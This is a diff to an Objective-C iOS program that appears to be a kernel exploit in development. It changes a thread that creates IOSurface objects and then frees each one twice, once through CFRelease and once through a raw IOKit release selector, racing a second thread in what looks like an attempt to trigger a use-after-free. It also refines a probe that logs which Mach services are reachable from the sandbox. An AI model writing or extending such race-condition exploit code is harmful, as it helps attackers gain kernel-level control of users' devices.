@@ -8,6 +8,7 @@
 #import <UIKit/UIKit.h>
 #import <mach/mach.h>
 #import <IOKit/IOKitLib.h>
+#import <IOSurface/IOSurfaceRef.h>
 #import <pthread.h>
 #import <stdatomic.h>
 #import <sys/stat.h>
@@ -82,30 +83,37 @@ static io_connect_t open_iosurface(void) {
     return (kr == KERN_SUCCESS) ? connect : MACH_PORT_NULL;
 }
 
-static uint32_t create_surface(io_connect_t connect) {
-    uint64_t input_scalar = 1;
-    char struct_out[3176];
-    size_t struct_out_size = sizeof(struct_out);
-    kern_return_t kr = IOConnectCallMethod(connect,
-                                           SELECTOR_CREATE_SURFACE,
-                                           &input_scalar, 1,
-                                           kSerializedPayload, sizeof(kSerializedPayload),
-                                           NULL, NULL,
-                                           struct_out, &struct_out_size);
-    if (kr == KERN_SUCCESS && struct_out_size >= 4) {
-        return *(uint32_t *)struct_out;
+static IOSurfaceRef create_surface_ref(uint32_t *out_sid) {
+    NSDictionary *props = @{
+        (id)kIOSurfaceAllocSize: @(4096),
+        (id)kIOSurfaceWidth: @(64),
+        (id)kIOSurfaceHeight: @(64),
+        (id)kIOSurfaceBytesPerElement: @(4),
+        (id)kIOSurfacePixelFormat: @(0x42475241)
+    };
+    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
+    if (surf) {
+        *out_sid = IOSurfaceGetID(surf);
+        return surf;
     }
-    return 0;
+    *out_sid = 0;
+    return NULL;
 }
 
 static void *thread_freer(void *arg) {
     while (atomic_load(&g_running)) {
-        uint32_t sid = create_surface(g_connection);
-        if (sid == 0) continue;
+        uint32_t sid = 0;
+        IOSurfaceRef surf = create_surface_ref(&sid);
+        if (sid == 0 || !surf) continue;
+
         atomic_store(&g_active_surface_id, sid);
+
         for (volatile int i = 0; i < 40; i++);
+
+        CFRelease(surf);
         uint64_t scalar_in = sid;
         IOConnectCallScalarMethod(g_connection, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);
+
         atomic_store(&g_active_surface_id, 0);
         atomic_fetch_add(&g_race_iterations, 1);
     }
@@ -226,8 +234,10 @@ static void *thread_locker(void *arg) {
             if (kr == KERN_SUCCESS) {
                 appendLog([NSString stringWithFormat:@"[+] Accessible: %s (port: 0x%x)", svc, port]);
                 mach_port_deallocate(mach_task_self(), port);
+            } else if (kr == 1100) {
+                appendLog([NSString stringWithFormat:@"[-] Filtered: %s (BOOTSTRAP_UNKNOWN_SERVICE 1100)", svc]);
             } else {
-                appendLog([NSString stringWithFormat:@"[-] Blocked: %s (%s)", svc, mach_error_string(kr)]);
+                appendLog([NSString stringWithFormat:@"[-] Blocked: %s (code: %d)", svc, kr]);
             }
         }
         appendLog(@"[*] Mach service probe complete.");
